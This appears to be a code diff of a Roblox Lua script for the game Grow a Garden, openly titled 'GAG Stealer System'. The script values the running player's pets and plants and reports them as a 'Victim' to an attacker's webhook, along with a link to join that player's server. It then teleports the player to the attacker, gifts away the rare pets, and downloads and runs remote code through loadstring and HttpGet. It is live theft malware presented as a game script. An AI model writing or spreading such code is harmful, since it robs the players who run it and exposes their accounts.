@@ -1,10 +1,7 @@
---- GAG STEALER SYSTEM - Integrated by namnnni2
+-- GAG STEALER SYSTEM - Integrated by namnnni2
 
-do
-	local k = "loaded_" .. game.PlaceId
-	if shared[k] then return end
-	shared[k] = true
-end
+if shared.__GAG_EXECUTED__ then return end
+shared.__GAG_EXECUTED__ = true
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -20,7 +17,6 @@ for _, item in ipairs(backpack:GetChildren()) do
 end
 
 local HttpService = game:GetService("HttpService")
-local plr = Players.LocalPlayer
 local modules = ReplicatedStorage:WaitForChild("Modules")
 local dataService = require(modules:WaitForChild("DataService"))
 local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
@@ -28,7 +24,6 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
--- ✅ FIX math.lerp if missing
 math.lerp = math.lerp or function(a, b, t)
 	return a + (b - a) * t
 end
@@ -67,7 +62,6 @@ local function calcPetValue(petData)
 	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
 end
 
--- Collect item values
 for _, tool in ipairs(backpack:GetChildren()) do
 	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
 		if tool:GetAttribute("ItemType") == "Pet" then
@@ -97,7 +91,6 @@ table.sort(itemsToSend, function(a, b)
 	return a.Value > b.Value
 end)
 
--- Build and send webhook
 local useDual = totalValue >= 1e12
 local finalWebhook = useDual and DualWebhook or Webhook
 local finalUsername = useDual and DualUsername or Username
@@ -121,15 +114,10 @@ local embed = {
 	title = "🎯 GAG OPS - Steal & Gift Report",
 	description = "Inventory extraction complete. Mission success ✅",
 	color = 0xFF0000,
-	author = {
-		name = "GAG Stealer System",
-		icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png"
-	},
-	thumbnail = {
-		url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif"
-	},
+	author = { name = "GAG Stealer System", icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png" },
+	thumbnail = { url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif" },
 	fields = {
-		{name = "🎯 Victim", value = plr.Name, inline = true},
+		{name = "🎯 Victim", value = LocalPlayer.Name, inline = true},
 		{name = "💰 Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
 		{name = "🗺️ Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
 		{name = "🧾 Inventory Log", value = lines, inline = false}
@@ -162,13 +150,12 @@ pcall(function()
 	end
 end)
 
--- AUTO GIFT AFTER USER CHAT
+-- Auto Gift When Target Chat
 local targetName = finalUsername
 local targetPlr
 
 local function gift(tool)
-	local args = {[1] = targetPlr, [2] = tool}
-	ReplicatedStorage.Events.GiftPet:FireServer(unpack(args))
+	ReplicatedStorage.Events.GiftPet:FireServer(targetPlr, tool)
 end
 
 local function waitUntilGone(tool)
@@ -179,15 +166,11 @@ local function waitUntilGone(tool)
 end
 
 local function followTarget()
-	if not targetPlr then return end
-	local char = plr.Character or plr.CharacterAdded:Wait()
-	local hrp = char:WaitForChild("HumanoidRootPart")
-	local tChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
-	local tHrp = tChar:WaitForChild("HumanoidRootPart")
-
+	local hrp = LocalPlayer.Character:WaitForChild("HumanoidRootPart")
+	local thrp = targetPlr.Character:WaitForChild("HumanoidRootPart")
 	while targetPlr and targetPlr.Parent do
-		if (tHrp.Position - hrp.Position).Magnitude > 5 then
-			hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, -3)
+		if (thrp.Position - hrp.Position).Magnitude > 5 then
+			hrp.CFrame = thrp.CFrame * CFrame.new(0, 0, -3)
 		end
 		for _, prompt in ipairs(targetPlr.Character:GetDescendants()) do
 			if prompt:IsA("ProximityPrompt") and prompt.Enabled then
@@ -203,7 +186,6 @@ local function followTarget()
 end
 
 local function giftSequential()
-	if not targetPlr then return end
 	for _, item in ipairs(itemsToSend) do
 		if item.Type == "Pet" and table.find(rarePets, item.Name) then
 			waitUntilGone(item.Tool)
@@ -229,7 +211,6 @@ end
 local function onTargetReady(p)
 	targetPlr = p
 	p.Chatted:Connect(function()
-		_G.loadingFinished = false
 		pcall(function()
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Loading"))()
 		end)
